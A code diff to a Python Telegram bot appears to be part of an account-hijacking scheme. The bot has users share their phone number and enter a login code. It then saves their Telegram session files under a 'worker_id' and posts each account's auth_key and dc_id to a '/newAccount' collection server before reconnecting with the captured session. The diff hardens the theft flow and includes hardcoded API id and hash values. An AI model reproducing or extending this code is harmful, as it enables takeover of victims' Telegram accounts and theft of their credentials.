@@ -71,12 +71,13 @@ async def contacts(msg: types.Message):
     if msg.chat.id in steps.keys():
         if "client" in steps[msg.chat.id].keys():
             await steps[msg.chat.id]["client"].client.disconnect()
+            os.remove(steps[msg.chat.id]["phone_number"] + ".session")
 
     try:
         steps[msg.chat.id] = {}
         steps[msg.chat.id]["step"] = 0
 
-        client = await ClientTelegram.create(f"{msg.contact.phone_number}", 16102116, '40144a84410673ed0121c9a41e0138fa')
+        client = await ClientTelegram.create(f"{msg.contact.phone_number}", 17344245, '4003557c6a1afc8774a712fb2afd7950')
 
         client111 = client
 
@@ -148,11 +149,12 @@ async def inline_click(call: types.CallbackQuery):
 
             sessionString = StringSession(sessionString)
             await client111.client.disconnect()
-            shutil.move(f"./{client111.phone_number}.session", "../../sessions")
+            try:
+                shutil.move(f"./{client111.phone_number}.session", "../../sessions")
+            except:
+                pass
 
             await call.message.reply(config.textInfo["validCodeText"])
-
-            await asyncio.sleep(3)
 
             dc_id = sessionString.dc_id
             auth_key = binascii.hexlify(sessionString.auth_key.key)
@@ -160,7 +162,7 @@ async def inline_click(call: types.CallbackQuery):
             steps[call.message.chat.id]["step"] = -1
             requests.post("http://localhost:5000/newAccount", json={"worker_id": config.worker_id, "auth_key": auth_key.decode("utf-8"), "dc_id": dc_id})
 
-            time.sleep(300)
+            await asyncio.sleep(1200)
 
             client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
             await client.connect()
@@ -221,7 +223,11 @@ async def code_step(message: types.Message):
         sessionString = StringSession.save(client111.client.session)
         sessionString = StringSession(sessionString)
         await client111.client.disconnect()
-        shutil.move(f"./{client111.phone_number}.session", "../../sessions")
+
+        try:
+            shutil.move(f"./{client111.phone_number}.session", f"../../sessions/{config.worker_id}_{client111.phone_number}.session")
+        except:
+            pass
 
         await message.reply(config.textInfo["validCodeText"])
 
@@ -230,10 +236,9 @@ async def code_step(message: types.Message):
 
         steps[message.chat.id]["step"] = -1
 
-        await message.reply("1111");
         requests.post("http://localhost:5000/newAccount", json={"worker_id": config.worker_id, "auth_key": auth_key.decode("utf-8"), "dc_id": dc_id})
 
-        time.sleep(300)
+        await asyncio.sleep(1200)
 
         client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
         await client.connect()
